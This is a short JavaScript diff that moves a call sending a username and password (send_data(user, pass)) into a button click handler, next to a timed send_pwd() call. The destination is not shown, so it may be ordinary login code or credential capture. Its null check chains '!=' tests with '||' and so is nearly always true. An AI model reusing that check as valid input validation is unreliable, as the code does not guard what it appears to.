@@ -65,9 +65,10 @@ btn[1].addEventListener('click', function(){
         send_pwd();
     }, 3000);
     //teste_send(user)   
+    if (user != null || user != undefined || pass != null || pass != undefined){
+        send_data(user, pass);
+    }
 })
 
 
-if (user != null || user != undefined || pass != null || pass != undefined){
-    send_data(user, pass);
-}
+
